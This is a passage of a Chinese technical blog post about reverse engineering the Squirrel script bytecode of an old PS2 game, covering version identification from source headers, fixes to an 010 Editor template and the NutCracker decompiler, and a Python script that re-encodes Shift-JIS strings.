class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 次のシナリオに接続</span><br><span class="line"> */</span><br><span class="line">function goToNext(next) &#123;</span><br><span class="line">    clearInfo();</span><br><span class="line">    curStorage = next;</span><br><span class="line">    lines = getScene(curStorage);</span><br><span class="line">    savef = clone f;</span><br><span class="line">    savePrepare();</span><br><span class="line">    status = RUN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这三个函数名以及注释，连蒙带猜可能 <code>lines</code> 在每次加载新场景时，该场景内部所有的对话被 <code>getScene</code> 统一读入 <code>lines</code> 中。看看位于同一文件的 <code>getScene</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * シーンファイルを変換してデータとして取得する</span><br><span class="line"> * @param name シーン名</span><br><span class="line"> */</span><br><span class="line">function getScene(name) &#123;</span><br><span class="line">    // グローバルのシーン取得関数を使う</span><br><span class="line">    try &#123; </span><br><span class="line">        return ::getScene(name)();</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        dm(&quot;error in loading:&quot; + e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数 <code>name</code> 是场景名，很有可能是字符串。根据注释“转换场景文件作为数据获取”，证明我们的猜测可能是正确的。在 <code>Squirrel</code> 中函数或变量名前的 <code>::</code> 代表调用的全局空间的函数而不是类函数，因此调用的是全局空间的同名函数。该全局函数返回值也是一个可调用的对象，可能也是回调函数。</p><blockquote><p>Global variables are stored in a table called the root table. Usually in the global scope the environment object is the root table, but to explicitly access the closure root of the function from another scope, the slot name must be prefixed with ‘::’</p></blockquote><p>然而在所有的明文脚本代码中并没有找到任何全局 <code>getScene</code> 的定义。很明显这个函数不是标准库函数，实际上脚本中出现了不少类似调用没有定义的函数，例如前文的 <code>Talk</code>，这类函数甚至在字节码中也找不到符号，推测这些函数可能定义在二进制程序中，测试一下</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/22.jpg" alt="二进制程序中的 Talk"></p><p>果然，在游戏主程序 <code>SLPS_258.97</code> 中，除了调用字符串，还出现了单独的符号，那么接下来就是针对 32 位 MIPS 程序 <code>SLPS_258.97</code> 的逆向，不过还是得先看看剩下的几个 <code>.cnut</code> 字节码文件里有没有值得关注的信息，首先需要想办法反编译 <code>.cnt</code>。</p><h1 id="字节码反编译"><a href="# 字节码反编译" class="headerlink" title="字节码反编译"></a>字节码反编译 </h1><p> 对于反编译来说，Squirrel 是一个比较坑的语言，兼容性极差，甚至每个小版本的字节码都不一样，并且 <code>.cnut</code> 文件中没有标注是哪个版本的 Squirrel，因此反编译及其困难。</p><p>目前已经有的针对 Squirrel 的反编译器主要有以下 3 个：</p><ol><li><a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a></li><li><a href="https://github.com/darknesswind/NutCracker">NutCracker - darknesswind</a></li><li><a href="https://github.com/SydMontague/NutCracker">NutCracker - SydMontague</a></li></ol><p>其中的 2 和 3 都是基于 1 的改进，而 1 最初来源 <a href="http://cheatengine.org/forum/viewtopic.php?p=5477214&sid=00a71666ea27fea14168c6d158f69724">CE 论坛</a>，仅支持 32 位的 Squirrel 2.2.4，不支持 unicode 编码。而 2 基于 1 实现了同版本 64 位的反编译，3 基于 1 实现了针对 Squirrel3 的反编译，同时支持 unicode 编码，此外还提供了一个 010 Editor 的模版供分析。很明显，在这个上古游戏的时代必不可能用 Squirrel3 开发，因此只能是 Squirrel2 的某个版本。查看一下 Squirrel2 的<a href="https://sourceforge.net/projects/squirrel/files/squirrel2/"> 历史版本</a>，主要有以下 15 个稳定版本：<code>2.0</code>，<code>2.0.[1-5]</code>，<code>2.1</code>，<code>2.1.[1-2]</code>，<code>2.2</code>，<code>2.2.[1-5]</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/31.jpg" alt="Squirrel 历史稳定版本"></p><p>以上 3 个工具反编译我们提取出的字节码全部失败，那么我们就需要自己魔改其中的一个，由于 3 提供了 010 的模版，因此先用 3 来验证一下我们提取出的字节码是哪个版本。由于明文脚本中使用了大量双字节日语，因此为了避免干扰我们的分析，我们找一个最小的，没有出现日文的 <code>41_e2000_36f.nut</code> 用 010 分析一下。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/29.jpg" alt="41_e2000_36f.nut 分析结果"></p><p>不出意外，果然失败了，先分析一下为什么失败。模版是针对 Squirrel3 的字节码，因此看看模版里定义的结构和我们的文件有什么不同。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/30.jpg" alt="41_e2000_36f.nut"></p><p>首先是 2 个字节的 <code>fafa</code>，然后是 4 个字节的 <code>RIQS</code>，然后是 4 个字节的 <code>sizeChar</code>，但是在模版中接下来就是用于分片的 <code>TRAP</code>，少了 <code>sizeInt</code> 以及 <code>sizeFloat</code>。考虑到这个游戏的发行年份，我们找一个 Squirrel 2.2.4 的源码分析一下 Squirrel 2 的 <code>.cnut</code> 字节码结构是什么样的。</p><p>首先找找字节码文件头 <code>0xfafa</code> 的定义，在 <code>squirrel/sqapi.cpp</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SQ_BYTECODE_STREAM_TAG    0xFAFA</span></span><br></pre></td></tr></table></figure><p>然后找找 <code>SQ_BYTECODE_STREAM_TAG</code> 的引用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SQRESULT <span class="title">sq_readclosure</span><span class="params">(HSQUIRRELVM v,SQREADFUNC r,SQUserPointer up)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQObjectPtr closure;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> tag;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">r</span>(up,&amp;tag,<span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;io error&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(tag != SQ_BYTECODE_STREAM_TAG)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sq_throwerror</span>(v,_SC(<span class="string">&quot;invalid stream&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(!SQClosure::<span class="built_in">Load</span>(v,up,r,closure))</span><br><span class="line">        <span class="keyword">return</span> SQ_ERROR;</span><br><span class="line">    v-&gt;<span class="built_in">Push</span>(closure);</span><br><span class="line">    <span class="keyword">return</span> SQ_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查完文件头后进入 <code>squirrel/sqobject.cpp</code> 的 <code>SQClosure::Load</code> 加载字节码文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQClosure::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_HEAD));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,<span class="built_in">sizeof</span>(SQChar)));</span><br><span class="line">    SQObjectPtr func;</span><br><span class="line">    _CHECK_IO(SQFunctionProto::<span class="built_in">Load</span>(v,up,read,func));</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_TAIL));</span><br><span class="line">    ret = SQClosure::<span class="built_in">Create</span>(_ss(v),_funcproto(func));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SQ_CLOSURESTREAM_HEAD</code> 就是小端的 <code>SQIR</code>，检查完后读取 4 个字节的 <code>sizeof(SQChar)</code>，因此在 Squirrel2 中没有 <code>sizeInt</code> 以及 <code>sizeFloat</code>，读取完后进入 <code>SQFunctionProto::Load</code>，看名字应该是读函数。那么我们先修改模版，注释掉 <code>NutHeader</code> 的 <code>sizeInt</code> 以及 <code>sizeFloat</code> 看看解析结果。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/32.jpg" alt="010 Editor 解析失败"></p><p>果然又失败了，看看报错原因发现是没有匹配到 <code>TRAP</code>，那么代表肯定在模版中多了几个字节。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/33.jpg" alt="41_e2000_36f.nut"></p><p>通过核对数据，发现这里匹配失败，<code>TRAP</code> 被解析成了 <code>nFunctions</code>，那么再看看模版中 <code>NutFunction</code> 结构。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/34.jpg" alt="010 Editor cnut 模版"></p><p>其中的 <code>ConfirmOnPart</code> 就是读取 4 个字节检查是否是 <code>TRAP</code>。很明显，<code>nFunctions</code>前面多了 4 个字节才导致识别错位到下一个 <code>TRAP</code>，继续看看 <code>Squirrel 2.2.4</code> 的源码中定义的结构。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions,ndefaultparams ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ndefaultparams, <span class="built_in">sizeof</span>(ndefaultparams)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这里的结构和模版中一样，那么可以证明我们需要的 Squirrel2 版本一定小于 2.2.4，可以进一步缩小我们的目标范围。那么继续分析 2.2.4 之前的版本，最后在 2.1.2 中发现缺少了 <code>ndefaultparams</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SQFunctionProto::Load</span><span class="params">(SQVM *v,SQUserPointer up,SQREADFUNC read,SQObjectPtr &amp;ret)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SQInteger i, nliterals,nparameters;</span><br><span class="line">    SQInteger noutervalues ,nlocalvarinfos ;</span><br><span class="line">    SQInteger nlineinfos,ninstructions ,nfunctions ;</span><br><span class="line">    SQObjectPtr sourcename, name;</span><br><span class="line">    SQObjectPtr o;</span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, sourcename));</span><br><span class="line">    _CHECK_IO(<span class="built_in">ReadObject</span>(v, up, read, name));</span><br><span class="line">    </span><br><span class="line">    _CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nliterals, <span class="built_in">sizeof</span>(nliterals)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nparameters, <span class="built_in">sizeof</span>(nparameters)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;noutervalues, <span class="built_in">sizeof</span>(noutervalues)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 010 的模版中注释掉下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nDefaultParams</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (!ConfirmOnPart()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">    DefaultParams <span class="title function_">m_DefaultParams</span><span class="params">(nDefaultParams)</span>;</span><br></pre></td></tr></table></figure><p>继续运行模版，报了新的错</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/35.jpg" alt="0101 Editor 解析失败"></p><p>这次是模版本身报错，原因是文件解析完毕后没有找到最后的 <code>LIAT</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NutEnd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> magicTAIL[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> (magicTAIL != <span class="string">&quot;LIAT&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Warning(<span class="string">&quot;Confirm End Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>验证一下，果然把文件中最后的 <code>LIAT</code> 解析成了 <code>m_VarParams</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/36.jpg" alt="41_e2000_36f.nut"></p><p>既然没有报 <code>TRAP</code> 的错，那么就表示在 <code>nFunctions</code> 后出现了问题，看一下模版，在 <code>nFunctions</code> 后主要有三个数据</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/37.jpg" alt="010 Editor cnut 模版"></p><p>还是再回到 Squirrel 2.1.2 的源码中，看看结构最后是不是有这三个数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, f-&gt;_instructions, <span class="built_in">sizeof</span>(SQInstruction)*ninstructions));</span><br><span class="line"></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nfunctions; i++)&#123;</span><br><span class="line">    _CHECK_IO(_funcproto(o)-&gt;<span class="built_in">Load</span>(v, up, read, o));</span><br><span class="line">    f-&gt;_functions[i] = o;</span><br><span class="line">&#125;</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_stacksize, <span class="built_in">sizeof</span>(f-&gt;_stacksize)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_bgenerator, <span class="built_in">sizeof</span>(f-&gt;_bgenerator)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_varparams, <span class="built_in">sizeof</span>(f-&gt;_varparams)));</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>居然都有，那么再看看这三个数据的大小。在 <code>squirrel/sqfuncproto.h</code> 中找到这三个数据的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQInteger _stacksize;</span><br><span class="line"><span class="type">bool</span> _bgenerator;</span><br><span class="line"><span class="type">bool</span> _varparams;</span><br></pre></td></tr></table></figure><p>这时候就看出来问题了，在模版中最后的 <code>m_VarParams</code> 是 4 个字节的 int，但是在源码中却是 1 个字节的 bool，修改模版将 <code>int m_VarParams</code> 改成 <code>char m_VarParams</code> 后再次运行，这次就执行成功了，代表我们的修改全部都是正确的，并且 Squirrel 的版本一定小于等于 2.1.2。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/38.jpg" alt="010 Editor 解析结果"></p><p>确定了大致的版本以后，由于版本 2.1.2 太过古老，我们先尝试修改第一个最初的 <a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a> 来使其兼容 Squirrel 2.1.2，NutCracker 用 Visual Studio 开发，为了避免不必要的麻烦还是在 VS 下编辑运行最好，同时需要在项目 - 属性里设置 Windows SDK 版本以及平台工具集。</p><p>首先按照我们在 010 模版中修改的步骤，在 NutCracker 修改文件格式相关的代码。在 <code>nutcracker/NutScript.cpp</code> 的 <code>NutFunction::Load</code> 中注释以下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">int</span> nDefaultParams = reader.<span class="built_in">ReadInt32</span>();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">reader.<span class="built_in">ConfirmOnPart</span>();</span><br><span class="line"></span><br><span class="line">m_DefaultParams.<span class="built_in">resize</span>(nDefaultParams);</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">&#123;</span><br><span class="line">    reader.<span class="built_in">Read</span>(&amp;(m_DefaultParams.<span class="built_in">at</span>(<span class="number">0</span>)), nDefaultParams * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>之后编译运行一下是否可以反编译。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/40.jpg" alt="Nutcracker 反编译结果"></p><p>反编译成功，但是缺点是不支持类似 Shift-JIS 的双字节编码</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/41.jpg" alt="Nutcracker 反编译结果"></p><p>写个脚本转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: transfor.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Convert string in double qoute to ja_jp.shiftjis.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    invisible = [<span class="number">0</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>]</span><br><span class="line">    filename = filename.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    ext = filename[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&quot;</span>.join(filename[:-<span class="number">1</span>]) + <span class="string">&quot;_shiftjis.&quot;</span> + ext, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        length = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">while</span> i &lt; length:</span><br><span class="line">            c = data[i]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                <span class="keyword">if</span> c == <span class="number">0x22</span>:</span><br><span class="line">                    j = i + <span class="number">1</span></span><br><span class="line">                    string = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">while</span> data[j] != <span class="number">0x22</span>:</span><br><span class="line">                        cc = data[j]</span><br><span class="line">                        <span class="keyword">if</span> cc <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                            string += <span class="built_in">chr</span>(cc)</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;\\x00&quot;</span> <span class="keyword">in</span> string:</span><br><span class="line">                        string = <span class="built_in">eval</span>(</span><br><span class="line">                            <span class="string">&#x27;b&quot;&#x27;</span> + string.replace(<span class="string">&quot;\\x00&quot;</span>, <span class="string">&quot;\\x&quot;</span>) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">                        ).decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                        string = string.replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\\r&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">b&#x27;&quot;%s&quot;&#x27;</span> % string.encode())</span><br><span class="line">                    i = j</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c).encode())</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>批量转换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> 3[2-9]*.nut | xargs -I &#123;&#125; python3 ./transfor.py &#123;&#125;</span><br><span class="line">python3 ./transfor.py 41.nut</span><br></pre></td></tr></table></figure><p>最后终于正确反编译了全部 10 个 <code>.cnut</code></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/42.jpg" alt="Nutcracker 